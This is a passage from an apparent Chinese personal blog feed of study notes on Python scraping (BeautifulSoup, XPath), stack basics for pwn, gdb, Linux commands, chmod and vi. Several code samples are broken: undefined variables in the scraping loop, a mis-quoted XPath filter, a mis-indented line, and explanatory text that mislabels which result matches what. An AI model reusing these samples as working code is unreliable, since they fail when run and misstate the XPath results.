class="line"></span><br></pre></td></tr></table></figure><p>即，使用<code>(?P&lt;分组名字&gt;原来正则)</code>从正则匹配的内容中进一步提取内容。</p><h2 id="二、BS4模块"><a href="#二、BS4模块" class="headerlink" title="二、BS4模块"></a>二、BS4模块</h2><h3 id="引入方式："><a href="#引入方式：" class="headerlink" title="引入方式："></a>引入方式：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><h3 id="使用方式-以抓取表格为例）："><a href="#使用方式-以抓取表格为例）：" class="headerlink" title="使用方式(以抓取表格为例）："></a>使用方式(以抓取表格为例）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 拿到页面源代码</span></span><br><span class="line"><span class="comment"># 2. 使用bs4进行解析. 拿到数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.xxx.com/a.html&quot;</span></span><br><span class="line">resp = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line"><span class="comment"># 1. 把页面源代码交给BeautifulSoup进行处理, 生成bs对象</span></span><br><span class="line">page = BeautifulSoup(resp.text, <span class="string">&quot;html.parser&quot;</span>)  <span class="comment"># 指定html解析器</span></span><br><span class="line"><span class="comment"># 2. 从bs对象中查找数据</span></span><br><span class="line"><span class="comment"># find(标签, 属性=值)</span></span><br><span class="line"><span class="comment"># find_all(标签, 属性=值)</span></span><br><span class="line">table = page.find(<span class="string">&quot;table&quot;</span>, attrs=&#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;hq_table&quot;</span>&#125;)</span><br><span class="line">trs = table.find_all(<span class="string">&quot;tr&quot;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> trs:  <span class="comment"># 每一行</span></span><br><span class="line">    target_1 = tr.find_all(<span class="string">&quot;td&quot;</span>)  <span class="comment"># 拿到每行中的所有td</span></span><br><span class="line">    target_2 = tds[<span class="number">0</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_3 = tds[<span class="number">1</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_4 = tds[<span class="number">2</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_5 = tds[<span class="number">3</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_6 = tds[<span class="number">4</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_7 = tds[<span class="number">5</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    target_8 = tds[<span class="number">6</span>].text  <span class="comment"># .text 表示拿到被标签标记的内容</span></span><br><span class="line">    <span class="built_in">print</span>(name, low, avg, high, gui, kind, date)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="核心方法："><a href="#核心方法：" class="headerlink" title="核心方法："></a>核心方法：</h3><p><code>find(标签, 属性=值)</code></p><p><code>find_all(标签, 属性=值)</code></p><p>​    按照次序填写要找的标签名和属性名即可。其中，标签名的传参为<strong>字符串</strong>，属性名由于<code>class、id</code>等是python的关键字，可以使用<code>attrs=&#123;键值对&#125;</code>来代替，键值对的键和值均为<strong>字符串</strong>。</p><h2 id="三、Xpath模块"><a href="#三、Xpath模块" class="headerlink" title="三、Xpath模块"></a>三、Xpath模块</h2><p>Xpath是XML文档中搜索的一门语言，html是XML的子集</p><h3 id="模块引入："><a href="#模块引入：" class="headerlink" title="模块引入："></a>模块引入：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure><h3 id="具体使用："><a href="#具体使用：" class="headerlink" title="具体使用："></a>具体使用：</h3><p>​    若xml为一个字符串形式的，有标签节点组成的xml字符串，从中提取信息可以遵循这样的语法：</p><p>​    注：<strong>Xpath的定位在开发者工具中右键复制选项，可实现智能定位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;book&gt;</span></span><br><span class="line"><span class="string">    &lt;id&gt;1&lt;/id&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;野花遍地香&lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;price&gt;1.23&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;nick&gt;臭豆腐&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;author&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10086&quot;&gt;周大强&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget1&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget2&lt;/nick&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget3&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;/author&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;partner&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppc1&quot;&gt;AAAAim1&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc2&quot;&gt;AAAAim2&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc3&quot;&gt;AAAAim3&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc4&quot;&gt;AAAAim4&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;/partner&gt;</span></span><br><span class="line"><span class="string">&lt;/book&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = etree.XML(xml)</span><br><span class="line"><span class="comment">#etree.XML用于匹配xml</span></span><br><span class="line"><span class="comment">#etree.HTML用于匹配html</span></span><br><span class="line"><span class="comment">#etree.parse用于匹配本地文件</span></span><br><span class="line"></span><br><span class="line">result1 = tree.xpath(<span class="string">&quot;/book&quot;</span>)  <span class="comment"># /表示层级关系. 第一个/是根节点</span></span><br><span class="line"></span><br><span class="line">result2 = tree.xpath(<span class="string">&quot;/book/name/text()&quot;</span>)  <span class="comment"># text() 拿文本</span></span><br><span class="line"></span><br><span class="line">result3 = tree.xpath(<span class="string">&quot;/book/author//nick/text()&quot;</span>)  <span class="comment"># //所有后代</span></span><br><span class="line"></span><br><span class="line">result4 = tree.xpath(<span class="string">&quot;/book/author/*/nick/text()&quot;</span>)  <span class="comment"># * 任意的节点. 通配符</span></span><br><span class="line"></span><br><span class="line">result5 = tree.xpath(<span class="string">&quot;/book/partner/nick[1]/text()&quot;</span>)  <span class="comment"># 表示在该目录下的第一个元素，匹配到AAAAim1。注意，此语法中无[0]！</span></span><br><span class="line"></span><br><span class="line">result6 = tree.xpath(<span class="string">&quot;/book/partner/nick[@id=&quot;</span>pbc2<span class="string">&quot;]/text()&quot;</span>) <span class="comment"># 使用[]用于按照标签筛选，结果为AAAAim2</span></span><br><span class="line"></span><br><span class="line"> result7 = tree.xpath(<span class="string">&quot;/book/partner/nick/@id&quot;</span>) <span class="comment"># 直接提取nick标签的id属性</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>其中<code>//</code>代表任意的子集（可以是一层或多层），只要存在就能找到；<br>而<code>/*/</code>代表且只能代表任意一层。</p><p>举例说：<br>代码块中，<code>result4</code>可以匹配到<code>TTTarget1</code>、<code>TTTarget2</code>、<code>TTTarget</code>。<br>但<code>result5</code>只能匹配到<code>TTTarget1</code>、<code>TTTarget2</code>,不能匹配到<code>TTTarget3</code>。</p><p>当使用<code>../xxx[n]/../text()</code>语法时，一定要记住这里的<strong>n是从1开始计数</strong>，如代码块中匹配到的就是<code>AAAAim1</code>，并非<code>AAAAim2</code>！</p><p>注意，当筛选两次，即使用如下语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ol_li_list = tree.xpath(<span class="string">&quot;/html/body/ol/li&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> ol_li_list:     <span class="comment"># 从每一个li中提取到文字信息</span></span><br><span class="line">     result = li.xpath(<span class="string">&quot;./a/text()&quot;</span>) <span class="comment">#在li中继续去寻找. 相对查找</span></span><br><span class="line">     <span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure><p><strong>在相对查找时，需要使用<code>./</code>而非<code>/</code>以表示相对路径！</strong></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn栈基础</title>
      <link href="/2022/02/14/PWN_%E6%A0%88%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/14/PWN_%E6%A0%88%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN-栈基础"><a href="#PWN-栈基础" class="headerlink" title="PWN_栈基础"></a>PWN_栈基础</h1><h2 id="程序段结构图："><a href="#程序段结构图：" class="headerlink" title="程序段结构图："></a>程序段结构图：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220214115234565.png" alt="image-20220214115234565"></p><h2 id="栈结构图："><a href="#栈结构图：" class="headerlink" title="栈结构图："></a>栈结构图：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220214120911800.png" alt="image-20220214120911800"></p><p>栈在内存中向下增长（地址下降）。<br>每个函数有自己的栈空间，从栈底（高地址）向栈顶（低地址）增长，函数与函数之间被称为栈帧。</p><p>其中，<br>    <strong>EBP</strong>指向栈底；<strong>ESP</strong>指向栈顶；</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gdb调试基础</title>
      <link href="/2022/02/14/gdb%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/14/gdb%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="gdb调试基础"><a href="#gdb调试基础" class="headerlink" title="gdb调试基础"></a>gdb调试基础</h1><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220213222351708.png" alt="image-20220213222351708" style="zoom:150%;" /><p><strong>调试</strong>：<br>    <code>s</code>默认在源代码下进行调试，在已经输入<code>s</code>的情况下，直接回车执行上一条语句；<br>    <code>si</code>为在汇编下进行调试；</p><p><strong>下断点：</strong></p><pre><code> 1. `b func_name` 2. `b /src/codefile.cc:81` gdb将在运行到源码文件/src/codefile.cc的第81行中断 3. `b *0x5859c0` &quot;*&quot;号是必须加在地址前的，0x5859c0为函数指针的地址</code></pre><p><strong>段列表：</strong><br>    <code>vmap</code>可以显示程序的段列表</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2022/01/29/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/29/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="一、Linux文件系统根目录下的目录及他们的作用"><a href="#一、Linux文件系统根目录下的目录及他们的作用" class="headerlink" title="一、Linux文件系统根目录下的目录及他们的作用"></a>一、Linux文件系统根目录下的目录及他们的作用</h2><p><strong>一切皆文件</strong></p><p>根目录下存多个文件夹（名称系统定义，不能修改）：</p><ul><li><p>/bin[<strong>常用</strong>] （/usr/bin 、/user/local/bin)    </p><p>为Binary缩写，存放着最常使用的命令</p></li><li><p>/sbin （/usr/sbin、/user/local/sbin）</p><p>s即SuperUser，存放管理员的系统管理程序</p></li><li><p>/home[<strong>常用</strong>]</p><p>用于存放不同用户创建的文件，结构为/home/用户名/……</p></li><li><p>/root[<strong>常用</strong>] </p><p>系统管理员，超级权限者的主目录</p></li><li><p>/lib </p><p>系统开机需要最基本的动态链接库,同时存放程序需要的动态链接库</p></li><li><p>/lost+found (隐藏目录)</p><p>存放非法关机后生成的文件</p></li><li><p>/etc [<strong>常用</strong>]</p><p>系统管理需要的配置文件和子目录，例如mysql的my.conf</p></li><li><p>/usr [<strong>常用</strong>]</p><p>非常重要，放置用户的很多应用程序和文件，类似programfiles</p></li><li><p>/boot [<strong>常用</strong>]</p><p>系统启动的核心文件，一些连接文件和镜像文件</p></li><li><p>/proc [<strong>不能动</strong>]</p><p>是一个虚拟的目录，是系统内存的映射，访问这个目录获得系统信息</p></li><li><p>/srv [<strong>不能动</strong>]</p><p>是service的缩写，存放一些服务启动后的数据</p></li><li><p>/sys [<strong>不能动</strong>]</p><p>这是Linux 2.6版本的拜年话，安装了内核新出现的文件系统sysfs</p></li><li><p>/tmp</p><p>存放临时文件</p></li><li><p>/dev </p><p>是device的缩写，把硬件当作文件形式储存，类似设备管理器</p></li><li><p>/media [<strong>常用</strong>]</p><p>系统会识别一些设备，如u盘、光驱，识别后，系统会将被识别的设备挂载在此目录下</p></li><li><p>/mnt [<strong>常用</strong>]</p><p>系统提供该目录让用户挂载其他文件系统，我们可以将外部储存挂载在该目录，然后进入就可以查看其中的内容了</p></li><li><p>/opt </p><p>默认将安装文件放在该目录下（安装前）</p></li><li><p>/user/local [<strong>常用</strong>]</p><p>安装软件的目录（安装后），一般是以源码方式安装的程序</p></li><li><p>/var [<strong>常用</strong>]</p><p>存放不断扩充的内容，常用的就是一些日志等等</p></li><li><p>/selinux [security-enhanced-Linux]</p><p>一种安全子系统，控制程序访问的文件，可以自行开启关闭</p></li></ul><p>linux的隐藏文件是以<code>.</code>开头的</p><h2 id="二、Linux实用指令"><a href="#二、Linux实用指令" class="headerlink" title="二、Linux实用指令"></a>二、Linux实用指令</h2><h3 id="1-帮助指令"><a href="#1-帮助指令" class="headerlink" title="1.帮助指令"></a>1.帮助指令</h3><p><code>man+space+[指令名]</code>：</p><p>输出帮助，一般会显示命令作用及各个参数，在linux中，各个参数可以组合使用，例如，ls指令有参数<code>-l</code>和<code>-a</code>，可以直接简化为<code>-la</code>。</p><p><code>help+[shell命令]</code>：</p><p>输出shell命令的帮助。</p><h3 id="2-文件目录指令"><a href="#2-文件目录指令" class="headerlink" title="2.文件目录指令"></a>2.文件目录指令</h3><p><strong><code>pwd</code>指令：</strong></p><p>作用：pwd指令用于显示当前绝对路径</p><p><strong><code>ls</code>指令：</strong></p><p>作用：<br>    ls指令用于列出目录下的内容<br>基本用法：<br>    <code>ls [选项] [目录或文件]</code><br>常用选项:<br>    <code>-a</code>:显示当前目录下的所有文件（包括隐藏文件）<br>    <code>-l</code>: 以列表的形式显示详细信息<br>    <code>-lh</code>：以列表的形式显示详细信息并且增加可读性（转化单位）</p><p><strong><code>cd</code>指令：</strong></p><p>作用：<br>    cd指令用于切换目录<br>基本语法：<br>    <code>cd [参数]</code><br>特殊用法：<br>    <code>cd ~</code>或者<code>cd :</code> 回到家目录<br>    <code>cd ..</code>回到上一级目录</p><p><strong><code>mkdir</code>指令：</strong></p><p>作用：<br>    mkdir指令用于创建目录<br>基本语法：<br>    <code>mkdir [选项] 要创建的目录</code><br>常用选项：<br>    <code>-p</code>：创建多级目录</p><p><strong><code>rmdir</code>指令：</strong></p><p>作用：<br>    rmdir指令删除空目录<br>基本语法：<br>    <code>rmdir [选项] 要删除的目录</code><br>使用细节：<br>    rmdir删除的目录是空的，如果目录下有内容是无法删除的</p><p>如果要删除非空目录，使用**<code>rm -rf [目录]</code>**来强制删除非空目录。</p><p><strong><code>touch</code>指令：</strong></p><p>创建空文件</p><p><strong><code>cp</code>指令</strong>：</p><p>作用：<br>    cp指令拷贝文件到指定目录<br>基本语法：<br>    <code>cp [选项] source destination</code><br>常用选项：<br>    <code>-r</code> ：递归赋值整个文件夹<br>常见用法：<br>    使用<code>\cp</code>表示默认覆盖原有文件</p><p><strong><code>rm</code>指令</strong>：</p><p>作用：<br>    删除文件或目录<br>基本语法：<br>    <code>rm [选项] 要删除的文件或目录</code><br>常用选项：<br>    <code>-r</code>：递归删除整个文件夹<br>    <code>-f</code>：强制删除不提示</p><p><strong><code>mv</code>指令：</strong></p><p>作用：<br>    移动文件与目录或重命名<br>基本语法：<br>    <code>mv oldNameFile newNameFile</code>（重命名）<br>    <code>mv /temp/movefile /targetFolder</code>(移动)</p><p><strong><code>cat</code>指令：</strong></p><p>作用：<br>    查看文件内容（只读）<br>基本语法：<br>    cat [选项] 要查看的文件<br>常用选项：<br>    <code>-n</code>显示行号</p><p><strong><code>tail</code>指令：</strong></p><p>作用：<br>    tail指令用于输出文件尾部的内容，默认为十行，一般用与监听文件内容变化<br>基本语法：<br>    <code>tail 文件</code>（查看文件尾十行内容）<br>    <code>tail -n 5 文件</code>（查看文件尾五行内容）<br>    <code>tail -f 文件</code>（监听文档的所有更新）</p><p><strong><code>&gt;</code>指令和<code>&gt;&gt;</code>指令：</strong></p><p>作用：<br>    用于进行重定向和追加（即覆盖和添加）<br>基本语法：<br>    1）<code>ls -l &gt;a.txt</code>（将列表的内容写入文件a.txt中)<br>    2）<code>ls -al &gt;&gt;b.txt</code>(将列表内容追加到b.txt文件后)<br>    3）<code>cat 文件1 &gt; 文件2</code>（用文件1的内容覆盖文件2）<br>    4）echo “text”&gt;&gt;文件 （将内容追加到文件中）</p><p><strong><code>ln</code>指令：</strong></p><p>作用：<br>    添加软链接（类似快捷方式）<br>基本语法：<br>    <code>ln -s [原文件或目录] [软链接名] </code>（给源文件创建一个软链接）</p><p><strong><code>history</code>指令：</strong></p><p>查看最近执行的n（默认500）条指令<br><code>！</code>语法：直接使用<code>!5</code>执行最近执行的第5条指令</p><h3 id="3、时间指令"><a href="#3、时间指令" class="headerlink" title="3、时间指令"></a>3、时间指令</h3><p><strong><code>date</code>（时间）<code>cal</code>（日历）</strong></p><h3 id="4、搜索查找指令"><a href="#4、搜索查找指令" class="headerlink" title="4、搜索查找指令"></a>4、搜索查找指令</h3><p><strong><code>find</code>指令：</strong></p><p>作用：<br>    从指定目录向下递归遍历各个子目录，将满足条件的文件或目录显示在终端<br>基本语法：<br>    <code>find [搜索范围] [选项]</code><br>选项说明：<br>    <code>-name</code> 按照指定的文件名查找<br>    <code>-user</code>按照指定用户所拥有的文件<br>    <code>-size</code>按照指定的大小查找文件文件</p><p>举例：<br>    <code>find /home -name hello.txt</code>（在home目录下查找名为hello.txt的文件）<br>    <code>find /opt -user nobody</code> (在opt目录下查找所有者为nobody的文件)<br>    <code>find / -size +200M</code>（查找系统中大于200M的文件）<br>其中，文件大小的表示放大（<code>-</code>小于，<code>+</code>大于，无符号大呢关于，单位有kMG）</p><p><strong><code>locate</code>指令</strong>：（过时，需要自行安装）</p><p>作用：<br>    快速定位文件路径<br>基本语法：<br>    <code>locate [文件名]</code><br>前趋指令：<br>    <code>updatedb</code></p><h2 id="三、Linux权限管理"><a href="#三、Linux权限管理" class="headerlink" title="三、Linux权限管理"></a>三、Linux权限管理</h2><h3 id="1-权限基本介绍"><a href="#1-权限基本介绍" class="headerlink" title="1.权限基本介绍"></a>1.权限基本介绍</h3><p>例：<code>ls  -l</code> 中显示的内容如下：</p><p><code>-rwxrw-r-- 1 root root 1213 Feb 2 09:39 abc</code></p><p>对最前面的十个（0~9位）字符进行说明：</p><p>​    第 0 位确定文件类型(d, - , l , c , b)<br>​        <strong>l</strong> 是链接，相当于 <strong>windows</strong> 的快捷方式<br>​        <strong>d</strong> 是目录，相当于 <strong>windows</strong> 的文件夹<br>​        <strong>c</strong> 是字符设备文件，鼠标，键盘<br>​        <strong>b</strong> 是块设备，比如硬盘</p><p>​    第 1-3 位确定所有者（该文件的所有者）拥有该文件的权限。—User</p><p>​    第 4-6 位确定所属组（同用户组的）拥有该文件的权限，—Group </p><p>​    第 7-9 位确定其他用户拥有该文件的权限 —Other；</p><h3 id="2-rwx权限详解"><a href="#2-rwx权限详解" class="headerlink" title="2. rwx权限详解"></a>2. rwx权限详解</h3><h4 id="1-rwx作用到文件："><a href="#1-rwx作用到文件：" class="headerlink" title="1)rwx作用到文件："></a>1)rwx作用到文件：</h4><p>[ r ]代表可读(read): 可以读取,查看<br>[ w ]代表可写(write): 可以修改,但是不代表可以删除该文件,删除一个文件的前提条件是对该文件所在的目录有写权限，才能删除该文件.<br>[ x ]代表可执行(execute):可以被执行</p><h4 id="2）rwx作用到目录"><a href="#2）rwx作用到目录" class="headerlink" title="2）rwx作用到目录"></a>2）rwx作用到目录</h4><p>[ r ]代表可读(read): 可以读取，ls 查看目录内容<br>[ w ]代表可写(write): 可以修改, 对目录内创建+删除+重命名目录<br>[ x ]代表可执行(execute):可以进入该目录，使用cd指令</p><h4 id="3）rwx的数字表示"><a href="#3）rwx的数字表示" class="headerlink" title="3）rwx的数字表示"></a>3）rwx的数字表示</h4><p>可用数字表示为: r=4,w=2,x=1 因此 rwx=4+2+1=7 , 数字可以进行组合；</p><p>因此，一位数字就可以对应一类用户的权限。</p><h3 id="3-修改权限"><a href="#3-修改权限" class="headerlink" title="3.修改权限"></a>3.修改权限</h3><p>通过<code>chmod</code>指令，可以修改文件或者目录的权限，有以下两种方法：</p><h4 id="1）-、-、-变更权限"><a href="#1）-、-、-变更权限" class="headerlink" title="1）+ 、-、= 变更权限"></a>1）+ 、-、= 变更权限</h4><p><code>u</code>:所有者   <code>g</code>:所有组   <code>o</code>:其他人   <code>a</code>:所有人(u、g、o 的总和)</p><ol><li><code>chmod   u=rwx,g=rx,o=x   文件/目录名</code></li><li><code>chmod   o+w    文件/目录名</code></li><li><code>chmod   a-x    文件/目录名</code></li></ol><p>举例说明:</p><ol><li>给 abc 文件 的所有者读写执行的权限，给所在组读执行权限，给其它组读执行权限。</li></ol><p>​        <code>chmod u=rwx,g=rx,o=rx abc</code></p><ol start="2"><li>给 abc 文件的所有者除去执行的权限，增加组写的权限</li></ol><p>​        <code>chmod u-x,g+w abc</code></p><ol start="3"><li>给 abc 文件的所有用户添加读的权限</li></ol><p>​        <code>chmod a+r abc</code></p><h4 id="2-通过数字变更权限"><a href="#2-通过数字变更权限" class="headerlink" title="2)通过数字变更权限"></a>2)通过数字变更权限</h4><p>按照<code>chmod nnn  文件/目录名</code>的方式转化即可：</p><p>​    <strong>其中n对应rwx的数字表示</strong>；</p><p>​    <strong>三位n分别对应<code>u</code>:所有者   <code>g</code>:所有组   <code>o</code>:其他人</strong></p><p>举例说明：</p><p>​    由于r=4 w=2 x=1  rwx=4+2+1=7 </p><p>​    因此<code>chmod u=rwx,g=rx,o=x  a.txt</code></p><p>​    相当于<code>chmod 751  a.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vi和vim的基础使用</title>
      <link href="/2022/01/29/vi%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/01/29/vi%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="vi的基础使用"><a href="#vi的基础使用" class="headerlink" title="vi的基础使用"></a>vi的基础使用</h1><p>vim即vi的增强版，带有代码补全高亮等功能。</p><h2 id="一、vi和vim的三种模式"><a href="#一、vi和vim的三种模式" class="headerlink" title="一、vi和vim的三种模式"></a>一、vi和vim的三种模式</h2><ul><li>正常模式：移动光标，删除字符或者整行，复制粘贴</li><li>插入模式（一般输入i进入）：编辑模式</li><li>命令行模式：（输入esc，然后：）提供相关指令，存档、离开等等</li></ul><p><strong>三种模式的相互转化：</strong></p><p>命令行中输入：<code>vim xxx</code>进入 <em>一般模式</em>；</p><p>在 <em>一般模式</em>中，输入<code>i或者a</code>进入 <em>编辑模式</em>；输入<code>：或者/</code>进入 <em>命令模式</em></p><p>在 <em>命令模式</em>或者 <em>一般模式</em>中，输入<code>esc</code>进入 <em>一般模式</em></p><p><strong>命令行模式的退出方式：</strong></p><p><code>：wq</code>-保存并退出</p><p><code>：q</code>-退出，不保存</p><p><code>：q！</code>-强制退出，不保存</p><h2 id="二、vi快捷键总结"><a href="#二、vi快捷键总结" class="headerlink" title="二、vi快捷键总结"></a>二、vi快捷键总结</h2><h3 id="1-一般模式下的处理"><a href="#1-一般模式下的处理" class="headerlink" title="1.一般模式下的处理"></a>1.一般模式下的处理</h3><p><strong>拷贝</strong>：拷贝当前行为<code>yy</code>；拷贝从当前行开始，直到向下的n行<code>nyy</code>（如<code>5yy</code>)</p><p><strong>粘贴</strong>：输入p</p><p><strong>删除</strong>：删除当前行为<code>dd</code>；删除从当前行开始，直到向下的n行<code>ndd</code>（如<code>5dd</code>)</p><p><strong>撤销</strong>：输入<code>u</code>撤销</p><p><strong>定位到首、末行</strong>：输入<code>G（即shift+g）</code>移动到最末行，输入<code>gg</code>移动到首行</p><p><strong>定位到某一行</strong>：输入要定位的行号（如 <code>20</code>），然后输入<code>G（即shift+g）</code></p><h3 id="2-命令行模式的处理"><a href="#2-命令行模式的处理" class="headerlink" title="2.命令行模式的处理"></a>2.命令行模式的处理</h3><p><strong>查找</strong>：输<code>/</code>进入命令行模式，输入要查找的字符串，回车即可，下一个为<code>n</code></p><p><strong>设置行号</strong>：输<code>：</code>进入命令行模式，输入<code>set nu</code>打开行号，输入<code>set nonu</code>关闭行号</p><h2 id="三、快捷键汇总"><a href="#三、快捷键汇总" class="headerlink" title="三、快捷键汇总"></a>三、快捷键汇总</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112602834.png" alt="image-20220129112602834"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112635532.png" alt="image-20220129112635532"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112720141.png" alt="image-20220129112720141"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112740533.png" alt="image-20220129112740533"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112802395.png" alt="image-20220129112802395"></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式简单笔记</title>
      <link href="/2022/01/23/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2022/01/23/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
